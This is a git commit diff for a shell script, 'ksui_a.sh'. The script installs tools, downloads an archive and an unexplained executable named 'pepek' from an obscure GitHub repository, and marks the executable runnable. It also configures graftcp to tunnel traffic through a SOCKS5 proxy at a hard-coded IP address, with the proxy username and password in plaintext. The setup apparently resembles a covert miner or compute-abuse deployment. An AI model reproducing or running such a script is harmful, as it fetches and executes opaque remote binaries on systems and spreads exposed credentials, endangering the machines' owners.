a140ffd2bb3a08a1d8edbdb8fd5053d665833da4
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-05-24 18:43:10 +0700

    Update ksui_a.sh

--- ksui_a.sh
+++ ksui_a.sh
@@ -1,3 +1,21 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 18.223.155.101:1080
+socks5_username = sempakcok
+socks5_password = gunturmanis
+END
+
 wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek
 
 chmod +x pepek
